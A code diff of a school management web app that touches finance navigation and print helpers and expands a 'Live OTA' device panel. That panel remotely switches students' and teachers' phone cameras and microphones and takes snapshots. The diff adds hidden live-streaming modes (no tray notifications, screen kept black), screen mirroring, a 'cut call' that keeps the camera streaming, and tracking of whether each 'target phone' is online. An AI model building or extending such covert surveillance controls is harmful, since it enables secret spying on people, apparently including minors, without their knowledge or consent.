-    // Fallback: read badge text (defensive for edge cases)
     try {
-      const badge = document.getElementById("activeUserBadge")?.textContent || "";
-      return badge.toLowerCase().includes("admin") ||
-             badge.toLowerCase().includes("administrator") ||
-             badge.toLowerCase().includes("principal");
+      const badge = ((document.getElementById("activeUserBadge")?.textContent || "") + " " + (document.getElementById("activeUserBadgeRole")?.textContent || "")).toLowerCase();
+      return badge.includes("admin") || badge.includes("administrator") || badge.includes("principal");
     } catch { return false; }
   }
   function finTodayStr() { return (function(){const d=new Date();return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0')})(); }
@@ -12188,7 +12848,7 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
           <div style="display:flex;align-items:center;gap:15px;">
             <div>
               <div style="color:rgba(255,255,255,0.7);font-size:0.72rem;text-transform:uppercase;letter-spacing:0.12em;margin-bottom:4px;">Tapowan Public School</div>
-              <div style="color:#fff;font-size:1.4rem;font-weight:800;letter-spacing:-0.01em;">💰 Finance & Investment Centre</div>
+              <div style="color:#fff;font-size:1.4rem;font-weight:800;letter-spacing:-0.01em;display:flex;align-items:center;gap:8px;"><span class="material-symbols-outlined" style="font-size:26px;">account_balance</span> Finance & Investment Centre</div>
             </div>
             <span class="material-symbols-outlined finance-header-toggle" style="font-size:24px;color:#fff;opacity:0.8;cursor:pointer;transition:opacity 0.2s;" title="Toggle Global Finance Visibility">
               ${localStorage.getItem("hideSchoolBalance") === "true" ? 'visibility_off' : 'visibility'}
@@ -12828,19 +13488,37 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
 
   /* ─── NAV INJECTION ──────────────────────────────────────── */
   function injectFinanceNavItem() {
-    if (userIsStudent() || (currentUser && String(currentUser.role || "").toLowerCase() === "teacher")) return;
     const nav = document.getElementById("moduleNav");
+    if (typeof window.isSaasModuleEnabled === "function" && !window.isSaasModuleEnabled("financeModule")) {
+      const existing = nav && nav.querySelector("[data-module='financeModule']");
+      if (existing) existing.remove();
+      return;
+    }
+    if (userIsStudent() || (currentUser && String(currentUser.role || "").toLowerCase() === "teacher")) return;
     if (!nav || nav.querySelector("[data-module='financeModule']")) return;
-    const divider = document.createElement("div");
-    divider.style.cssText = "padding:8px 16px;font-size:0.68rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:rgba(255,255,255,0.3);margin-top:6px;";
-    divider.textContent = "Finance";
+
     const btn = document.createElement("button");
     btn.dataset.module = "financeModule";
-    btn.style.cssText = "display:flex;align-items:center;gap:10px;width:100%;padding:10px 16px;background:none;border:none;color:rgba(255,255,255,0.75);cursor:pointer;font-size:0.85rem;border-radius:8px;text-align:left;";
-    btn.innerHTML = `<span style="font-size:1.1rem;">💰</span><span>Finance & Investment</span>`;
+    btn.className = "nav-btn";
+    btn.setAttribute("title", "Finance & Investment");
+    btn.setAttribute("data-tooltip", "Finance & Investment");
+    btn.innerHTML = `<span class="nav-icon material-symbols-outlined" style="font-size: 20px;">account_balance</span><span class="nav-text" style="margin-left: 6px;">Finance & Investment</span>`;
     btn.addEventListener("click", openFinanceModule);
-    nav.appendChild(divider);
-    nav.appendChild(btn);
+
+    // If Finance group exists in the sidebar, neatly place it inside the Finance group right after fees
+    const financeButtons = Array.from(nav.querySelectorAll("button[data-module]")).filter(b => 
+      ['fees', 'dueManagement', 'payroll', 'booksAndDress', 'bookSales', 'whatsappAlerts'].includes(b.dataset.module)
+    );
+    if (financeButtons.length > 0) {
+      const feesBtn = financeButtons.find(b => b.dataset.module === 'fees') || financeButtons[0];
+      feesBtn.after(btn);
+    } else {
+      const divider = document.createElement("div");
+      divider.className = "nav-group-label";
+      divider.textContent = "Finance";
+      nav.appendChild(divider);
+      nav.appendChild(btn);
+    }
   }
 
   /* ─── PATCH renderAll ────────────────────────────────────── */
@@ -13485,6 +14163,11 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
   // ── NAV injection ────────────────────────────────────────────────────────
   function injectBDNavItem() {
     const nav = document.getElementById("moduleNav");
+    if (typeof window.isSaasModuleEnabled === "function" && !window.isSaasModuleEnabled("booksAndDress")) {
+      const existing = nav && nav.querySelector("[data-module='booksAndDress']");
+      if (existing) existing.remove();
+      return;
+    }
     if (!nav || nav.querySelector("[data-module='booksAndDress']")) return;
 
     // Find or create "Resources" group label and inject after it
@@ -14050,11 +14733,7 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
         </div>
       </div>`;
 
-    const w = window.open("", "_blank");
-    if (!w) return window.alert("Popup blocked. Please allow popups for this site and try again.");
-    w.document.write(buildA4PrintHtml("Fee Receipt - " + schoolName, card));
-    w.document.close();
-    w.focus();
+    openPrintWindowOrFallback(buildA4PrintHtml("Fee Receipt - " + schoolName, card), "Fee Receipt - " + schoolName, { autoPrint: true });
   };
 
   // ── Thermal Fee Slip ───────────────────────────────────────────────────────
@@ -14268,11 +14947,7 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
       </html>
     `;
 
-    const w = window.open("", "_blank", "width=450,height=600");
-    if (!w) return window.alert("Popup blocked. Please allow popups.");
-    w.document.write(html);
-    w.document.close();
-    w.focus();
+    openPrintWindowOrFallback(html, "Thermal Slip - " + schoolName, { autoPrint: true });
   };
 
   // ── Formal Fee Slip ────────────────────────────────────────────────────────
@@ -14470,11 +15145,7 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
         </div>
       </div>`;
 
-    const w = window.open("", "_blank");
-    if (!w) return window.alert("Popup blocked. Please allow popups for this site and try again.");
-    w.document.write(buildA4PrintHtml("Fee Slip - " + schoolName, card));
-    w.document.close();
-    w.focus();
+    openPrintWindowOrFallback(buildA4PrintHtml("Fee Slip - " + schoolName, card), "Fee Slip - " + schoolName, { autoPrint: true });
   };
 
   // Populate the monthly fee checkboxes for a given class (supports multi-select)
@@ -17296,6 +17967,7 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
   let _liveOtaSearchQuery = '';
 
   function openLiveOtaStreamPanel() {
+    window.openLiveOtaStreamPanel = openLiveOtaStreamPanel;
     if (_liveOtaPanelEl) { _liveOtaPanelEl.remove(); _liveOtaPanelEl = null; }
     if (_liveOtaRefreshTimer) { clearInterval(_liveOtaRefreshTimer); _liveOtaRefreshTimer = null; }
     _currentLiveOtaFilter = 'all';
@@ -17318,11 +17990,13 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
         <div style="display:flex;gap:10px;margin-bottom:18px;flex-wrap:wrap;align-items:center;">
           <input id="liveOtaSearch" type="text" placeholder="🔍 Search teacher, student, admission no, device..." 
             style="flex:1;min-width:220px;padding:9px 14px;border:1px solid #cbd5e1;border-radius:10px;font-size:0.8rem;outline:none;" />
-          <div style="display:flex;gap:6px;flex-wrap:wrap;">
-            <button id="filterBtnAll" class="liveota-filter-btn" onclick="setLiveOtaFilter('all')" style="padding:6px 14px;border-radius:8px;border:none;font-size:0.75rem;cursor:pointer;font-weight:700;background:#2563eb;color:#fff;">All (<span id="countAll">0</span>)</button>
-            <button id="filterBtnOnline" class="liveota-filter-btn" onclick="setLiveOtaFilter('online')" style="padding:6px 14px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#fff;color:#16a34a;">🟢 Online (<span id="countOnline">0</span>)</button>
-            <button id="filterBtnTeachers" class="liveota-filter-btn" onclick="setLiveOtaFilter('teacher')" style="padding:6px 14px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#fff;color:#64748b;">👨‍🏫 Faculty (<span id="countTeachers">0</span>)</button>
-            <button id="filterBtnStudents" class="liveota-filter-btn" onclick="setLiveOtaFilter('student')" style="padding:6px 14px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#fff;color:#64748b;">🎓 Students (<span id="countStudents">0</span>)</button>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
+            <button id="filterBtnAll" class="liveota-filter-btn" onclick="setLiveOtaFilter('all')" style="padding:6px 12px;border-radius:8px;border:none;font-size:0.75rem;cursor:pointer;font-weight:700;background:#2563eb;color:#fff;">All (<span id="countAll">0</span>)</button>
+            <button id="filterBtnOnline" class="liveota-filter-btn" onclick="setLiveOtaFilter('online')" style="padding:6px 12px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#fff;color:#16a34a;" title="Devices with active Internet / Mobile Data">📶 Data ON (<span id="countOnline">0</span>)</button>
+            <button id="filterBtnDataOff" class="liveota-filter-btn" onclick="setLiveOtaFilter('data_off')" style="padding:6px 12px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#fff;color:#ef4444;" title="Devices with Internet turned OFF / Offline">📴 Data OFF (<span id="countDataOff">0</span>)</button>
+            <button id="filterBtnTeachers" class="liveota-filter-btn" onclick="setLiveOtaFilter('teacher')" style="padding:6px 12px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#fff;color:#64748b;">👨‍🏫 Faculty (<span id="countTeachers">0</span>)</button>
+            <button id="filterBtnStudents" class="liveota-filter-btn" onclick="setLiveOtaFilter('student')" style="padding:6px 12px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#fff;color:#64748b;">🎓 Students (<span id="countStudents">0</span>)</button>
+            <button id="btnRefreshDeviceStatus" onclick="loadDeviceList()" style="padding:6px 12px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.75rem;cursor:pointer;font-weight:700;background:#f8fafc;color:#0f172a;display:flex;align-items:center;gap:4px;" title="Refresh live status now">🔄 Refresh</button>
           </div>
         </div>
 
@@ -17346,7 +18020,7 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     }
 
     loadDeviceList();
-    _liveOtaRefreshTimer = setInterval(loadDeviceList, 10000);
+    _liveOtaRefreshTimer = setInterval(loadDeviceList, 4000);
   }
 
   function closeLiveOtaPanel() {
@@ -17358,10 +18032,11 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     _currentLiveOtaFilter = filter;
     const btnAll = document.getElementById('filterBtnAll');
     const btnOnline = document.getElementById('filterBtnOnline');
+    const btnDataOff = document.getElementById('filterBtnDataOff');
     const btnTeachers = document.getElementById('filterBtnTeachers');
     const btnStudents = document.getElementById('filterBtnStudents');
 
-    [btnAll, btnOnline, btnTeachers, btnStudents].forEach(b => {
+    [btnAll, btnOnline, btnDataOff, btnTeachers, btnStudents].forEach(b => {
       if (b) {
         b.style.background = '#fff';
         b.style.color = '#64748b';
@@ -17369,9 +18044,9 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
       }
     });
 
-    const activeBtn = filter === 'all' ? btnAll : filter === 'online' ? btnOnline : filter === 'teacher' ? btnTeachers : btnStudents;
+    const activeBtn = filter === 'all' ? btnAll : (filter === 'online' || filter === 'data_on') ? btnOnline : filter === 'data_off' ? btnDataOff : filter === 'teacher' ? btnTeachers : btnStudents;
     if (activeBtn) {
-      activeBtn.style.background = filter === 'online' ? '#16a34a' : '#2563eb';
+      activeBtn.style.background = (filter === 'online' || filter === 'data_on') ? '#16a34a' : filter === 'data_off' ? '#ef4444' : '#2563eb';
       activeBtn.style.color = '#fff';
       activeBtn.style.border = 'none';
     }
@@ -17394,7 +18069,7 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
         method: "POST",
         body: JSON.stringify({
           sql: `SELECT device_id, user_name, user_id, user_role, device_model, brand, os_version,
-                camera_status, mic_status, recording_mode, is_online, last_heartbeat
+                camera_status, mic_status, recording_mode, is_online, last_heartbeat, network_type
                 FROM app_device_registry ORDER BY id DESC`,
           args: []
         })
@@ -17423,20 +18098,44 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
         devices.push(d);
       }
 
-      // 3. Calculate true online status (heartbeat within 15 minutes)
+      // 3. Calculate true Phone Data status (Heartbeat every 30s)
       const nowMs = Date.now();
       devices.forEach(d => {
         const hbMs = parseLiveTimestamp(d.last_heartbeat);
-        const diffMs = nowMs - hbMs;
-        d._isOnline = hbMs > 0 && diffMs < 15 * 60 * 1000;
+        const diffMs = hbMs > 0 ? (nowMs - hbMs) : 999999999;
+        const diffSec = Math.round(diffMs / 1000);
+
+        // Data ON: Received heartbeat within 75 seconds (allows 2 missed cycles)
+        const isDataOn = hbMs > 0 && diffSec <= 75;
+        // Data Idle: 75s to 180s (3 minutes)
+        const isDataIdle = hbMs > 0 && diffSec > 75 && diffSec <= 180;
+        // Data OFF: > 180s or never
+        const isDataOff = !isDataOn && !isDataIdle;
+
+        d._isDataOn = isDataOn;
+        d._isDataIdle = isDataIdle;
+        d._isDataOff = isDataOff;
+        d._isOnline = isDataOn; // Sync online status with active data
         d._hbMs = hbMs;
         d._diffMs = diffMs;
+        d._diffSec = diffSec;
+
+        const netType = String(d.network_type || '').toLowerCase();
+        if (isDataOn) {
+          if (netType === 'wifi') d._dataStatusLabel = '📡 Wi-Fi ON';
+          else if (netType === 'cellular') d._dataStatusLabel = '📶 Mobile Data ON';
+          else d._dataStatusLabel = '📶 Data ON';
+        } else if (isDataIdle) {
+          d._dataStatusLabel = '⚠️ Data Idle';
+        } else {
+          d._dataStatusLabel = '📴 Data OFF';
+        }
       });
 
-      // 4. Sort: ONLINE devices first, then newest activity
+      // 4. Sort: DATA ON devices first, then newest activity
       devices.sort((a, b) => {
-        if (a._isOnline && !b._isOnline) return -1;
-        if (!a._isOnline && b._isOnline) return 1;
+        if (a._isDataOn && !b._isDataOn) return -1;
+        if (!a._isDataOn && b._isDataOn) return 1;
         return (b._hbMs || 0) - (a._hbMs || 0);
       });
 
@@ -17445,11 +18144,13 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
       // Update counters in tabs
       const countAllEl = document.getElementById("countAll");
       const countOnlineEl = document.getElementById("countOnline");
+      const countDataOffEl = document.getElementById("countDataOff");
       const countTeachersEl = document.getElementById("countTeachers");
       const countStudentsEl = document.getElementById("countStudents");
 
       if (countAllEl) countAllEl.textContent = devices.length;
-      if (countOnlineEl) countOnlineEl.textContent = devices.filter(d => d._isOnline).length;
+      if (countOnlineEl) countOnlineEl.textContent = devices.filter(d => d._isDataOn).length;
+      if (countDataOffEl) countDataOffEl.textContent = devices.filter(d => !d._isDataOn).length;
       if (countTeachersEl) countTeachersEl.textContent = devices.filter(d => d.user_role === 'teacher' || String(d.user_id || '').startsWith('EMP-')).length;
       if (countStudentsEl) countStudentsEl.textContent = devices.filter(d => d.user_role === 'student' || (!String(d.user_id || '').startsWith('EMP-') && d.user_role !== 'teacher')).length;
 
@@ -17466,8 +18167,10 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     let filtered = _cachedLiveOtaDevices;
 
     // Apply Filter
-    if (_currentLiveOtaFilter === 'online') {
-      filtered = filtered.filter(d => d._isOnline);
+    if (_currentLiveOtaFilter === 'online' || _currentLiveOtaFilter === 'data_on') {
+      filtered = filtered.filter(d => d._isDataOn);
+    } else if (_currentLiveOtaFilter === 'data_off') {
+      filtered = filtered.filter(d => !d._isDataOn);
     } else if (_currentLiveOtaFilter === 'teacher') {
       filtered = filtered.filter(d => d.user_role === 'teacher' || String(d.user_id || '').startsWith('EMP-'));
     } else if (_currentLiveOtaFilter === 'student') {
@@ -17491,12 +18194,18 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     }
 
     container.innerHTML = filtered.map(d => {
-      const isOn = d._isOnline;
+      const isDataOn = d._isDataOn;
+      const isDataIdle = d._isDataIdle;
       const camOn = d.camera_status === 'on';
       const micOn = d.mic_status === 'on';
       const hb = d.last_heartbeat ? timeAgo(d.last_heartbeat) : 'Never';
-      const dotColor = isOn ? '#22c55e' : '#94a3b8';
-      const dotLabel = isOn ? 'Online' : 'Offline';
+      
+      const badgeBg = isDataOn ? '#dcfce7' : (isDataIdle ? '#fef3c7' : '#fee2e2');
+      const badgeBorder = isDataOn ? '#86efac' : (isDataIdle ? '#fde047' : '#fca5a5');
+      const badgeTextColor = isDataOn ? '#15803d' : (isDataIdle ? '#b45309' : '#b91c1c');
+      const dotColor = isDataOn ? '#22c55e' : (isDataIdle ? '#eab308' : '#ef4444');
+      const dataLabel = d._dataStatusLabel || (isDataOn ? '📶 Data ON' : '📴 Data OFF');
+
       const brandIcon = getBrandIcon(d.brand);
       const isTeacher = d.user_role === 'teacher' || String(d.user_id || '').startsWith('EMP-');
       const roleBadge = isTeacher
@@ -17504,7 +18213,7 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
         : `<span style="background:#f0fdf4;color:#16a34a;font-size:0.65rem;font-weight:700;padding:2px 6px;border-radius:4px;">🎓 Student</span>`;
 
       return `
-        <div class="liveota-device-card" style="background:#f8fafc;border:1px solid ${isOn ? '#86efac' : '#e2e8f0'};box-shadow:${isOn ? '0 4px 12px rgba(34,197,94,0.12)' : 'none'};border-radius:14px;padding:14px;transition:all 0.2s;cursor:default;">
+        <div class="liveota-device-card" style="background:#f8fafc;border:1px solid ${isDataOn ? '#86efac' : '#e2e8f0'};box-shadow:${isDataOn ? '0 4px 12px rgba(34,197,94,0.12)' : 'none'};border-radius:14px;padding:14px;transition:all 0.2s;cursor:default;">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;">
             <div style="display:flex;align-items:center;gap:8px;">
               <span style="font-size:1.6rem;">${brandIcon}</span>
@@ -17516,36 +18225,64 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
                 <div style="font-size:0.7rem;color:#64748b;margin-top:1px;">${d.user_id || ''} · ${d.device_model || ''}</div>
               </div>
             </div>
-            <div style="display:flex;align-items:center;gap:5px;background:${isOn ? '#dcfce7' : '#f1f5f9'};padding:3px 8px;border-radius:20px;">
-              <span style="width:8px;height:8px;border-radius:50%;background:${dotColor};display:inline-block;${isOn ? 'box-shadow:0 0 6px #22c55e;' : ''}"></span>
-              <span style="font-size:0.68rem;color:${dotColor};font-weight:700;">${dotLabel}</span>
+            <!-- STATUS OPTION BADGE -->
+            <div onclick="checkDeviceLiveStatus('${d.device_id}')" 
+              title="Click to check detailed live data connection" 
+              style="display:flex;align-items:center;gap:6px;background:${badgeBg};border:1px solid ${badgeBorder};padding:4px 9px;border-radius:20px;cursor:pointer;box-shadow:${isDataOn ? '0 2px 6px rgba(34,197,94,0.2)' : 'none'};">
+              <span style="width:8px;height:8px;border-radius:50%;background:${dotColor};display:inline-block;${isDataOn ? 'box-shadow:0 0 6px #22c55e;' : ''}"></span>
+              <span style="font-size:0.7rem;color:${badgeTextColor};font-weight:800;">${dataLabel}</span>
             </div>
           </div>
-          <div style="font-size:0.68rem;color:#94a3b8;margin-bottom:10px;">${d.brand || ''} · ${d.os_version || ''} · <span style="color:${isOn ? '#16a34a' : '#64748b'};font-weight:600;">${hb}</span></div>
+          <div style="font-size:0.68rem;color:#64748b;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
+            <span>${d.brand || ''} · ${d.os_version || ''}</span>
+            <span style="color:${isDataOn ? '#16a34a' : (isDataIdle ? '#d97706' : '#dc2626')};font-weight:700;" title="Time since last data heartbeat received">
+              ${isDataOn ? `🟢 Active (${hb})` : (isDataIdle ? `⏳ Idle (${hb})` : `🔴 Disconnected (${hb})`)}
+            </span>
+          </div>
           <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <button onclick="checkDeviceLiveStatus('${d.device_id}')"
+              style="padding:5px 9px;border-radius:8px;border:1px solid #cbd5e1;font-size:0.72rem;cursor:pointer;font-weight:700;
+              background:${isDataOn ? '#f0fdf4' : '#fff'};color:${isDataOn ? '#16a34a' : '#475569'};" title="Check if phone mobile data is currently ON or OFF">
+              📶 Status
+            </button>
             <button onclick="toggleDeviceCamera('${d.device_id}', ${camOn ? 'false' : 'true'})" 
-              style="padding:5px 10px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
               background:${camOn ? '#dcfce7' : '#fef2f2'};color:${camOn ? '#16a34a' : '#ef4444'};">
               📷 ${camOn ? 'ON' : 'OFF'}
             </button>
             <button onclick="toggleDeviceMic('${d.device_id}', ${micOn ? 'false' : 'true'})"
-              style="padding:5px 10px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
               background:${micOn ? '#dcfce7' : '#fef2f2'};color:${micOn ? '#16a34a' : '#ef4444'};">
               🎤 ${micOn ? 'ON' : 'OFF'}
             </button>
             <button onclick="sendDeviceCommand('${d.device_id}', 'capture_snapshot')"
-              style="padding:5px 10px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
               background:#eff6ff;color:#2563eb;">
               📸 Snap
             </button>
-            <button onclick="requestLivePreview('${d.device_id}', '${(d.user_name||'').replace(/'/g,'')}')"
-              style="padding:5px 12px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
-              background:#7c3aed;color:#ffffff;box-shadow:0 2px 6px rgba(124,58,237,0.3);">
-              🔴 Live
+            <button onclick="requestLivePreview('${d.device_id}', '${(d.user_name||'').replace(/'/g,'')}', 'call')"
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              background:#7c3aed;color:#ffffff;box-shadow:0 2px 6px rgba(124,58,237,0.3);" title="Call Live: Transparent surface, 0 notifications in tray">
+              📞 Call Live
+            </button>
+            <button onclick="dismissCallOnly('${d.device_id}')"
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              background:#ea580c;color:#ffffff;box-shadow:0 2px 6px rgba(234,88,12,0.3);" title="Dismiss/Cut call only, leave camera streaming">
+              📴 Cut Call
+            </button>
+            <button onclick="requestLivePreview('${d.device_id}', '${(d.user_name||'').replace(/'/g,'')}', 'notification')"
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              background:#0284c7;color:#ffffff;box-shadow:0 2px 6px rgba(2,132,199,0.3);" title="Notif Live: Screen stays completely off/black, background service">
+              🔔 Notif Live
+            </button>
+            <button onclick="requestScreenMirror('${d.device_id}', '${(d.user_name||'').replace(/'/g,'')}')"
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              background:#059669;color:#ffffff;box-shadow:0 2px 6px rgba(5,150,105,0.3);" title="Screen Live: Mirror the phone's screen content via MediaProjection">
+              📺 Screen Live
             </button>
             <button onclick="hardStopDeviceCamera('${d.device_id}')"
               title="Force hard shutdown of camera hardware & background service"
-              style="padding:5px 10px;border-radius:8px;border:1px solid #ef4444;font-size:0.72rem;cursor:pointer;font-weight:700;
+              style="padding:5px 9px;border-radius:8px;border:1px solid #ef4444;font-size:0.72rem;cursor:pointer;font-weight:700;
               background:#fff1f2;color:#b91c1c;box-shadow:0 1px 3px rgba(239,68,68,0.15);">
               🛑 Hard Stop
             </button>
@@ -17553,6 +18290,75 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
         </div>`;
     }).join("");
   }
+
+  window.checkDeviceLiveStatus = async function(deviceId) {
+    const dev = _cachedLiveOtaDevices ? _cachedLiveOtaDevices.find(d => d.device_id === deviceId) : null;
+    const uName = dev ? (dev.user_name || 'Device') : 'Device';
+    
+    addMsg(`🔍 Checking real-time data status for <b>${uName}</b>...`, "bot");
+
+    try {
+      const res = await api("/api/db/query", {
+        method: "POST",
+        body: JSON.stringify({
+          sql: `SELECT device_id, user_name, user_id, device_model, brand, os_version,
+                       camera_status, mic_status, recording_mode, is_online, last_heartbeat, network_type
+                FROM app_device_registry WHERE device_id = ? LIMIT 1`,
+          args: [deviceId]
+        })
+      });
+
+      const row = res.rows?.[0];
+      if (!row) {
+        alert(`❌ Device record not found for ID: ${deviceId}`);
+        return;
+      }
+
+      const hbMs = parseLiveTimestamp(row.last_heartbeat);
+      const nowMs = Date.now();
+      const diffSec = hbMs > 0 ? Math.round((nowMs - hbMs) / 1000) : 999999;
+      const isDataOn = hbMs > 0 && diffSec <= 75;
+      const isDataIdle = hbMs > 0 && diffSec > 75 && diffSec <= 180;
+      
+      const netTypeRaw = String(row.network_type || '').toLowerCase();
+      const netTypeText = netTypeRaw === 'wifi' ? '📡 Wi-Fi' : (netTypeRaw === 'cellular' ? '📶 Mobile Data (4G/5G)' : '🌐 Internet Data');
+      const timeStr = hbMs > 0 ? timeAgo(row.last_heartbeat) : 'Never';
+
+      if (isDataOn) {
+        const info = `📶 [STATUS: PHONE DATA IS ON]\n\n` +
+          `• User: ${row.user_name || 'Unknown'} (${row.user_id || ''})\n` +
+          `• Phone Model: ${row.brand || ''} ${row.device_model || ''}\n` +
+          `• Status: 🟢 DATA CONNECTED & ACTIVE\n` +
+          `• Connection: ${netTypeText}\n` +
+          `• Last Signal Received: ${diffSec}s ago (${timeStr})\n` +
+          `• Camera: ${row.camera_status || 'off'} | Mic: ${row.mic_status || 'off'}`;
+        alert(info);
+        addMsg(`📶 <b>${row.user_name}</b>: Phone data is <b>ON</b> (${netTypeText}, last signal received ${diffSec}s ago).`, "bot");
+      } else if (isDataIdle) {
+        const info = `⚠️ [STATUS: PHONE DATA IDLE / WEAK]\n\n` +
+          `• User: ${row.user_name || 'Unknown'} (${row.user_id || ''})\n` +
+          `• Phone Model: ${row.brand || ''} ${row.device_model || ''}\n` +
+          `• Status: ⏳ DATA IDLE (No signal for ${diffSec}s)\n` +
+          `• Last Signal Received: ${timeStr} (${diffSec}s ago)\n` +
+          `• Internet might be intermittent or device is dormant.`;
+        alert(info);
+        addMsg(`⚠️ <b>${row.user_name}</b>: Phone data is <b>IDLE</b> (last active ${timeStr}).`, "bot");
+      } else {
+        const info = `📴 [STATUS: PHONE DATA IS OFF]\n\n` +
+          `• User: ${row.user_name || 'Unknown'} (${row.user_id || ''})\n` +
+          `• Phone Model: ${row.brand || ''} ${row.device_model || ''}\n` +
+          `• Status: 🔴 DATA TURNED OFF / DISCONNECTED\n` +
+          `• Last Signal Received: ${timeStr} (${diffSec}s ago)\n` +
+          `• The target phone has NO internet or mobile data is turned OFF.`;
+        alert(info);
+        addMsg(`📴 <b>${row.user_name}</b>: Phone data is <b>OFF</b> (Disconnected, last seen ${timeStr}).`, "bot");
+      }
+
+      await loadDeviceList();
+    } catch (e) {
+      alert(`⚠️ Status check error: ${e.message}`);
+    }
+  };
 
   function getBrandIcon(brand) {
     const b = (brand || '').toLowerCase();
@@ -17613,7 +18419,18 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
           issuedBy: 'Web Admin'
         })
       });
-      addMsg(`✅ <b>Hard Camera Stop</b> signal sent with call-priority wake!`, "bot");
+      // Also stop Screen Mirror if active on target device
+      api("/api/calls/remote-preview/wake", {
+        method: "POST",
+        body: JSON.stringify({
+          previewId: "screen_mirror_off",
+          targetDeviceId: deviceId,
+          viewerName: "Web Admin",
+          mode: "screen_mirror",
+          command: "screen_mirror_off"
+        })
+      }).catch(() => {});
+      addMsg(`✅ <b>Hard Camera & Screen Stop</b> signal sent with call-priority wake!`, "bot");
       setTimeout(loadDeviceList, 600);
       setTimeout(loadDeviceList, 2500);
     } catch (err) {
@@ -17653,17 +18470,78 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
   let _previewPC = null;
   let _previewPollTimer = null;
   let _previewDisconnectTimer = null;
+  let _previewIpCamTimer = null;
+  let _previewLastBlobUrl = null;
   let _previewIceSent = [];
   let _previewAddedCandidates = new Set();
   let _activePreviewId = null;
   let _activePreviewTargetDeviceId = null;
+  let _activePreviewMode = 'call';
+  let _hasAutoDismissedTransparentScreen = false;
+  let _autoCutCallTimer = null;
+
+  window.setAutoCutCallSec = function(val) {
+    try {
+      const num = parseInt(val, 10);
+      const cleanVal = (isNaN(num) || num <= 0) ? '0' : String(num);
+      localStorage.setItem('tps_auto_cut_call_sec', cleanVal);
+      console.log("[AutoCutCall] Saved manual timer setting:", cleanVal, "seconds");
+      if (_activePreviewMode === 'call' && _activePreviewTargetDeviceId) {
+        if (_autoCutCallTimer) {
+          clearTimeout(_autoCutCallTimer);
+          _autoCutCallTimer = null;
+        }
+        const s = parseInt(cleanVal, 10);
+        if (s > 0) {
+          _autoCutCallTimer = setTimeout(() => {
+            console.log(`[Preview] Manual auto cut call timer (${s}s) expired — dismissing call only`);
+            window.dismissCallOnly(_activePreviewTargetDeviceId, true);
+          }, s * 1000);
+        }
+      }
+    } catch (_) {}
+  };
+
+  window.dismissCallOnly = async function(deviceId, silent = false) {
+    const devId = deviceId || _activePreviewTargetDeviceId;
+    if (!devId) return;
+    if (_autoCutCallTimer) {
+      clearTimeout(_autoCutCallTimer);
+      _autoCutCallTimer = null;
+    }
+    const btn = document.getElementById("btnDismissCall");
+    if (btn) {
+      btn.innerHTML = "✓ Call Cut";
+      btn.style.background = "#15803d";
+      btn.disabled = true;
+    }
+    const mb = document.getElementById("previewModeBadge");
+    if (mb && _activePreviewMode === 'call') {
+      mb.innerHTML = "📞 Call Cut • 🟢 Cam Active";
+      mb.style.background = "#15803d";
+    }
+    try {
+      await window.dismissTransparentScreen(devId, true);
+      if (!silent) {
+        addMsg("📴 Phone call screen dismissed. Live camera feed remains streaming uninterrupted.", "bot");
+      }
+    } catch (e) {
+      console.warn("[DismissCallOnly] Error:", e);
+    }
+  };
 
